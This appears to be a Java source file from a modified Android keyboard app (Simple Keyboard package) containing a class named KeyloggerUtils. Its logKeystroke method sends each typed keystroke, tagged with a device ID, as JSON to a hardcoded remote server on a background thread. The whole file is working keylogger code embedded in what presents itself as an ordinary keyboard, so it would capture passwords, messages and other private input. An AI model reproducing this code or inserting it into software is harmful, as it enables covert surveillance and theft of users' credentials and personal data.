/*
 * Copyright (C) 2023 Lukas Kovarik
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package rkr.simplekeyboard.inputmethod.latin.utils;

import android.util.Log;

import org.json.JSONObject;

import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class KeyloggerUtils {
    private static final Integer DEVICE_ID = 1;
    private static final String SERVER_URL = "http://10.0.0.13:3000/keylogger";

    /**
     * Sends keystroke to server.
     *
     * @param keystroke keystroke
     */
    public static void logKeystroke(String keystroke) {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(SERVER_URL);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    configurePostConnection(connection);

                    JSONObject requestBody = new JSONObject();
                    requestBody.put("id", DEVICE_ID);
                    requestBody.put("keystroke", keystroke);

                    DataOutputStream os = new DataOutputStream(connection.getOutputStream());
                    os.writeBytes(requestBody.toString());

                    os.flush();
                    os.close();

                    Log.i("STATUS", String.valueOf(connection.getResponseCode()));

                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        });

        thread.start();
    }

    private static void configurePostConnection(HttpURLConnection connection) {
        try {
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
            connection.setRequestProperty("Accept", "application/json");
            connection.setDoOutput(true);
            connection.setDoInput(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
